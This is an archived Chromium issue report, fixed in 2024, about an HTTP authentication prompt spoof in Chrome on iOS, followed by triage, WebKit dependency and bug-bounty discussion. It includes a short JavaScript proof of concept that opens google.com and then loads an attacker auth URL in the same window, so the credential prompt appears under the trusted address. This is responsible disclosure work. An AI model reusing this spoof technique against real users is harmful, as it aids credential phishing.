# http authentication spoof on chrome iOS 

| Field | Value |
|-------|-------|
| **Issue ID** | [40055876](https://issues.chromium.org/issues/40055876) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Network>Auth, UI>Browser>Navigation |
| **Platforms** | iOS |
| **Reporter** | sh...@gmail.com |
| **Assignee** | mi...@google.com |
| **Created** | 2021-05-15 |
| **Bounty** | $1,000.00 |

## Description

Steps to reproduce the problem:
1.Host the below HTML file and Open the URL in iOS chrome 
```
<html>
                    <head>
                      <title>HTTP Auth Prompt Spoof IOS chrome (87.0.4280.163) </title>
                  </head>
                    <body>
                      <script>
                        (() => {
    const button = document.createElement('button');
    button.innerText = 'Click Me';

    button.addEventListener('click', async () => {
      window.open('https://google.com', 'g');
      setTimeout(() => {
        window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
      }, 2000);
    });

    document.body.appendChild(button);
  })()
                      </script>
                    </body>
                  </html>
```
2.Now click on "Click me Button"
3.You will get HTTP auth Prompt with URL "https://google.com" in omnibar 

What is the expected behavior?
HTTP auth Prompt should get opened with domain "'https://eviltrap.site"

What went wrong?
HTTP auth Prompt with URL "https://google.com"  

Did this work before? N/A 

Chrome version: 87.0.4280.163  Channel: stable
OS Version: 14.5
Flash Version:

## Attachments

- [shapa.html](attachments/shapa.html) (text/plain, 713 B)
- [Screenshot_1.jpg](attachments/Screenshot_1.jpg) (image/jpeg, 35.0 KB)
- [HTTP Auth_POC.mp4](attachments/HTTP Auth_POC.mp4) (video/mp4, 2.8 MB)
- [Tue Mar 19 2024 10:19:06 GMT+0000 (Greenwich Mean Time).png](attachments/Tue Mar 19 2024 10_19_06 GMT+0000 (Greenwich Mean Time).png) (image/png, 225.1 KB)

## Timeline

### [Deleted User] (2021-05-15)

[Empty comment from Monorail migration]

### xi...@chromium.org (2021-05-17)

Thanks for the report! Please take a look at https://crbug.com/719856#c9 for the explanation of this behavior.

### sh...@gmail.com (2021-05-17)

Hello Team , 

I feel this issue similar to below issue. Not to the issue you have duplicated. 

https://bugs.chromium.org/p/chromium/issues/detail?id=939689
https://bugs.chromium.org/p/chromium/issues/detail?id=884179

Where HTTP auth prompt get opened above in "google.com" ,which means you need provide credentials to proceed further on google.com 

and this was not available for  20 seconds, and there is no copy paste or any user interaction needed 
  
I have verified the POC on Desktop and Android the issue seems to be fixed it  HTTP auth get opened in New tab with attacker URL 

but  in iOS devices it get opened above "google.com", request you to kindly check attached video POC 

Fix will be the HTTP auth URL should be get opened in new tab 

so kindly please verify  again  


### xi...@chromium.org (2021-05-20)

Thanks for the additional PoC! Yes I think we should make it consistent across platforms. +gambard@, could you take a look? Thanks!

[Monorail components: Internals>Network>Auth UI>Browser>Navigation]

### ga...@chromium.org (2021-05-20)

I am not sure how we can fix it. It also reproduces in Safari.

The issue is that the auth dialog is coming before the navigation is committed, which means that the previous page is still considered as valid, so we don't update the URL displayed in the omnibox. I don't think that updating the omnibox URL is the right approach as it would probably leads to other security vulnerability.
Considering that the omnibox steady state is displaying "Sign in to website" (the user has to tap it to reveal the URL) and the prompt is clearly indicating from which website this auth dialog is coming, I am not sure I would do a fix in Chrome.

The fix should probably be in WebKit to commit the navigation when an auth dialog is shown.

Ali, Olivier: what do you think?

### ol...@chromium.org (2021-05-20)

How is that different from when you load the 'https://eviltrap.site" url in the omnibox? The behavior in that case is the one described as expected.
Is the navigation committed first in that case?

If yes, then we should file a bug to webkit, requesting to have the same behavior in both case.
If not, then we should fix it and have a consistent behavior.

But as you said, the box is quite clear on what website we are on

### [Deleted User] (2021-05-20)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-05-20)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aj...@chromium.org (2021-05-20)

The difference between this case and the case where the URL is typed directly into the omnibox is that for all navigations involving URLs typed into the omnibox, we immediately update the displayed URL to the typed URL. This is to avoid the odd user experience of typing a URL, then seeing the URL change back to the currently displayed site, and then get updated again. On the other hand, for a link tap, we don't update the displayed URL until the navigation commits, to avoid other URL spoofing bugs.

So I think the fix for this needs to be in WebKit. I've filed a security bug: https://bugs.webkit.org/show_bug.cgi?id=226035

### [Deleted User] (2021-05-21)

[Empty comment from Monorail migration]

### sh...@gmail.com (2021-07-01)

Any update from reward-topanel ?

### [Deleted User] (2021-08-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-11)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-22)

[Empty comment from Monorail migration]

### sh...@gmail.com (2021-10-28)

Do we have any update on this ?


### ga...@chromium.org (2021-10-29)

The WebKit bug is still "new".

### [Deleted User] (2021-11-15)

[Empty comment from Monorail migration]

### sh...@gmail.com (2021-12-16)

Is this bug is eligible for reward ?

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### sh...@gmail.com (2022-03-24)

Any update and Is this bug is eligible for reward ?

### ga...@chromium.org (2022-03-24)

+xinghui for #20 question.

### xi...@chromium.org (2022-03-24)

+amyressler for the reward question.

### am...@chromium.org (2022-03-25)

Issues in third-party products/external dependencies, like webkit, that manifest in Chrome are eligible for potential VRP rewards once the issue has been acknowledged, validated, and fixed by the owners of that product. In this case that would be Apple Webkit team. We don't have full insight into that until the bug is fixed and the patch is included in a Webkit update. So the only updates we can provide is once that occurs. Once that does occur this report will go to the VRP Panel for reward consideration. 

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-25)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-03)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-28)

[Empty comment from Monorail migration]

### aj...@chromium.org (2022-10-19)

[Empty comment from Monorail migration]

### ad...@chromium.org (2022-11-22)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-08)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-05)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-31)

[Empty comment from Monorail migration]

### de...@chromium.org (2023-06-12)

gambard@chromium.org,

Do we have an update on this issue? I am checking the current status due to Chrome P1 SLO.
I don't have access to https://bugs.webkit.org/show_bug.cgi?id=226035. Thank you for your update!

### aj...@chromium.org (2023-06-12)

Still no update on the WebKit bug. We can't really apply an SLO to bugs that are owned outside of Chrome.

### de...@chromium.org (2023-06-13)

Thanks for the update.
Is the bug on the WebKit side also P1?

### ga...@chromium.org (2023-06-13)

Webkit bug is P2.

### aj...@chromium.org (2023-06-13)

Note that Apple generally does not use the priority field in WebKit's bug tracker for prioritization. All prioritization happens in their internal bug tracker.

### de...@chromium.org (2023-06-15)

Thank you for sharing the information.

I am wondering if we should set P2 or keep P1 on our side. Since the issue is handled on WebKit side, we don't have much control. For the bug SLO purpose, I am not sure if keeping it as P1 is a good idea. Do you have thoughts? 

### ga...@chromium.org (2023-06-15)

Moving it to P2.

### [Deleted User] (2023-08-16)

[Empty comment from Monorail migration]

### [Deleted User] (2023-10-11)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-06)

[Empty comment from Monorail migration]

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-10)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-11)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-11)

This issue was migrated from crbug.com/chromium/1209466?no_tracker_redirect=1

[Multiple monorail components: Internals>Network>Auth, UI>Browser>Navigation]
[Monorail mergedwith: crbug.com/chromium/1375023]
[Monorail mergedinto: crbug.com/chromium/719856]
[Monorail components added to Component Tags custom field.]

### am...@chromium.org (2024-02-14)

Reopening this issue that appears was inadvertently closed as a duplicate in the issue tracker migration (reported and tracked as internal migration feedback issue [b/325072672](https://issues.chromium.org/issues/325072672))
Since this issue is in WebKit and there is no `External Dependency` in the new tracker this issue has been added to the `Status_ExternalDependency` hotlist.

### pe...@google.com (2024-02-15)

gambard: Uh oh! This issue still open and hasn't been updated in the last 1005 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### sh...@gmail.com (2024-02-15)

I am also waiting for update from 2 years
Just in case If any reward update I will be happy :)

### pe...@google.com (2024-03-01)

gambard: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### mi...@chromium.org (2024-03-04)

Sharan, do you have access to the WebKit bug  https://bugs.webkit.org/show_bug.cgi?id=226035 ? (I don't have access to verify if you are CC'd on that bug or not.)

The fix needs to happen there first before anything can happen here with a reward per #comment24 so I would recommend re-testing on latest versions of iOS in Safari and then asking for an update on the WebKit bug.

### sh...@gmail.com (2024-03-19)

Hello Team,

I dont have access to <https://bugs.webkit.org/show_bug.cgi?id=226035>

But I have retested it on Google chrome and safari and it seems there is address bar is updated with Sign in to website and no longer google.com

I have attached the screenshot

Regards
Sharan

### sh...@gmail.com (2024-03-19)

It seems the issue is fixed , let me know if you any updates

### sh...@gmail.com (2024-04-02)

Hello Team,

Is anyone looking into it ?

### aj...@google.com (2024-04-09)

Thanks, I can't reproduce this either (testing Chrome and Safari on iOS 17.4).

### sh...@gmail.com (2024-04-10)

Thank you for confirming it yes issue is fixed now

Can you please let me know if you have any update on reward

Regards
Sharan

### am...@chromium.org (2024-04-10)

Reward decisions are made after a bug is closed as fixed. This bug was marked as fixed yesterday so it was missed the cutoff for panel discussion this week. This bug will be assessed at a future VRP panel session. Thank you for your patience.

### am...@google.com (2024-04-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2024-04-22)

Congratulations! The Chrome VRP Panel has decided to award you $1,000 for this report of this spoofing issue. Thank you for your efforts and reporting this issue to us!

### sh...@gmail.com (2024-04-22)

Wow thank you so much


On Mon, Apr 22, 2024 at 9:56 AM <buganizer-system@google.com> wrote:

> Replying to this email means your email address will be shared with the
> team that works on this product.
> https://issues.chromium.org/issues/40055876
>
> *Changed*
>
> *am...@chromium.org <am...@chromium.org> added comment #80
> <https://issues.chromium.org/issues/40055876#comment80>:*
>
> Congratulations! The Chrome VRP Panel has decided to award you $1,000 for
> this report of this spoofing issue. Thank you for your efforts and
> reporting this issue to us!
>
> _______________________________
>
> *Reference Info: 40055876 http authentication spoof on chrome iOS *
> component:  Public Trackers > 1362134 > Chromium > Internals > Network >
> Auth <https://issues.chromium.org/components/1456376>
> status:  Fixed
> reporter:  sharan.panegav@gmail.com
> assignee:  aj...@google.com
> cc:  aj...@google.com, am...@chromium.org, cr...@chromium.org, and 9 more
> collaborators:  se...@chromium.org
> type:  Vulnerability
> access level:  Limited visibility
> priority:  P2
> severity:  S2
> duplicate:  40061364 <https://issues.chromium.org/issues/40061364>
> hotlist:  external_security_report
> <https://issues.chromium.org/hotlists/5433527>, reward-unpaid
> <https://issues.chromium.org/hotlists/5432783>, Security_Impact-Stable
> <https://issues.chromium.org/hotlists/5432902>, Status_ExternalDependency
> <https://issues.chromium.org/hotlists/5438152>
> retention:  Component default
> Chromium Labels:  Arch-x86_64, Via-Wizard-Security, skip-priority-update,
> Disable-Nags
> Component Ancestor Tags:  Internals, Internals>Network,
> Internals>Network>Auth, UI, UI>Browser, UI>Browser>Navigation
> Component Tags:  Internals>Network>Auth, UI>Browser>Navigation
> Milestone:  122
> OS:  iOS
> vrp-reward:  1000
>
>
> Generated by Google IssueTracker notification system.
>
> You're receiving this email because you are subscribed to updates on
> Google IssueTracker issue 40055876
> <https://issues.chromium.org/issues/40055876> where you have the roles:
> reporter, starred, cc
> Unsubscribe from this issue.
> <https://issues.chromium.org/issues/40055876?unsubscribe=true>
>


### pe...@google.com (2024-07-17)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055876)*
